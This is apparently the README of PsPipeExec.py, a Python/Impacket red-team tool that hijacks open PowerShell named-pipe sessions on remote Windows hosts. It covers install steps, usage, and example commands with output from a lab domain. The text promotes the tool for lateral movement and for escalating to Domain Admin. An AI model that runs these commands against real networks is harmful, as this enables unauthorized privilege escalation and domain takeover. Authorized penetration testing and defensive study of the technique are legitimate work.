# PsPipeExec.py

This tool is the continuation of my other tool, PsPipeExec.exe. This one is python based and works on Linux largely using Impacket.

In summary, if you have local admin on a remote host, you can connect to remote PowerShell sessions on that host and execute commands within those PowerShell sessions. Not only does this provide lateral movement opportunities, but also privilege escalation opportunities. For example, if you get local admin access through something like RBCD, Shadow Credentials, etc and their is a Domain Admin on the remote host with a PowerShell session open, you can run commands as the domain admin and add a user you control to the Domain Admins group.

## Installation
```
git clone https://github.com/e-fin/PsPipeExec.py.git
cd PsPipeExec.py
python3 -m venv .
source bin/activate
python3 -m pip install -r requirements
```

## Usage

```
usage: PsPipeExec.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-port [destination port]] [--list] [--pipe PIPE] [--command COMMAND] [--script SCRIPT] [--no-wmi] target

PowerShell Named Pipe Lateral Movement Tool

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -port [destination port]
                        Destination port to connect to SMB Server

PowerShell Pipes:
  --list                list PSHost pipes and exit
  --pipe PIPE           full pipe name under IPC$ to connect to
  --command COMMAND     run one command and exit (non-interactive)
  --script SCRIPT       run entire PS1 file
  --no-wmi              skip WMI owner lookup for pipes

```

## Examples

### List Remote PSHost Pipes (Credentials)
Pipe owners are resolved automatically via WMI. Use `--no-wmi` to skip the lookup.
```
$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --list

PSHost pipes on target:
   PSHost.134296493751823186.13108.DefaultAppDomain.powershell  (LAB\administrator)
```

### List Remote PSHost Pipes (Kerberos)
```
$ python3 PsPipeExec.py -k -no-pass ws01.lab.local --list      
  
PSHost pipes on target:
   PSHost.134296493751823186.13108.DefaultAppDomain.powershell  (LAB\administrator)
```

### List Remote PSHost Pipes (No WMI)
```
$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --list --no-wmi

PSHost pipes on target:
   PSHost.134296493751823186.13108.DefaultAppDomain.powershell
```

### Connect to Remote PSHost Pipe (Credentials)
The pipe owner is shown before connecting. Use `--no-wmi` to skip.
```
$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'

[*] Pipe owner: LAB\administrator
LAB\administrator

```

### Connect to Remote PSHost Pipe (Kerberos)
```
$ python3 PsPipeExec.py -k -no-pass ws01.lab.local --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'

[*] Pipe owner: LAB\administrator
LAB\administrator

```

### Connect to Remote PSHost Pipe INTERACTIVE
```
$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell   

[*] Pipe owner: LAB\administrator
Connected. Enter PowerShell commands; 'exit' to quit.
PS> whoami
lab\administrator
PS> $i = "hello"
PS> echo $i
hello
PS> 
```

### Connect to Remote PSHost Pipe and Run PS1 Script
```
$ cat test.ps1                                
echo hello
echo hello2
whoami
ipconfig

$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --script test.ps1

hello
hello2
lab\administrator

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : lab.local
   Link-local IPv6 Address . . . . . : fe80::f0d3:c6c2:48ad:94f5%13
   IPv4 Address. . . . . . . . . . . : 192.168.1.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::20c:29ff:fe9d:a180%13
                                       192.168.1.1


```
### Pipe Owner Resolution (WMI)

Pipe owners are resolved automatically using WMI Query Language (WQL) over DCOM. The tool extracts the PID from the pipe name (e.g. `13108` from `PSHost.134296493751823186.13108.DefaultAppDomain.powershell`) and runs two WQL queries under the hood:

```
ASSOCIATORS OF {Win32_Process.Handle="13108"} WHERE AssocClass=Win32_SessionProcess
ASSOCIATORS OF {Win32_LogonSession.LogonId="<LogonId>"} WHERE AssocClass=Win32_LoggedOnUser
```

This traces the process to its logon session, then to the user account — no command execution required. The lookup uses the same credentials as the SMB connection. If WMI access is restricted, the tool prints a warning and continues without owner info. Pass `--no-wmi` to skip the lookup entirely.
